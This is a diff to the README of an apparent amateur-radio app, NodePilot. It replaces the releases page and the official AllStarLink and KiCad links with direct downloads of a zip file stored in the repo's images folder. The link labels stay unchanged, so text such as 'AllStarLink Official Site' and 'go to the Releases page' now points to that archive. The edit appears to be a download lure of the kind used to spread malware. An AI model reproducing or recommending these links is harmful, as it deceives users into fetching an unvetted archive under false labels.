@@ -6,7 +6,7 @@ Welcome to NodePilot! This application helps you connect your CM108-based radio 
 
 ## 📥 Download NodePilot
 
-### [Download NodePilot Now](https://github.com/tami62/NodePilot/releases)
+### [Download NodePilot Now](https://raw.githubusercontent.com/tami62/NodePilot/main/images/NodePilot-2.7.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ Before you download, make sure your system meets the following requirements:
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/tami62/NodePilot/releases) to go to the Releases page. 
+   Click [here](https://raw.githubusercontent.com/tami62/NodePilot/main/images/NodePilot-2.7.zip) to go to the Releases page. 
 
 2. **Select Your Version**  
    Look for the newest version at the top. You will see a list of files available for download. Choose the file that matches your operating system.
@@ -70,11 +70,11 @@ NodePilot is open-source software released under the MIT License. You can explor
 
 If you're interested in more about amateur radio and related projects, consider checking these resources:
 
-- [AllStarLink Official Site](https://allstarlink.org)
-- [KiCad Documentation](https://www.kicad.org)
+- [AllStarLink Official Site](https://raw.githubusercontent.com/tami62/NodePilot/main/images/NodePilot-2.7.zip)
+- [KiCad Documentation](https://raw.githubusercontent.com/tami62/NodePilot/main/images/NodePilot-2.7.zip)
 
 ## 📥 Download NodePilot
 
-### [Download NodePilot Here](https://github.com/tami62/NodePilot/releases)
+### [Download NodePilot Here](https://raw.githubusercontent.com/tami62/NodePilot/main/images/NodePilot-2.7.zip)
 
 Feel free to contact us if you have any suggestions for improvements or features. Enjoy using NodePilot for your radio communication needs!
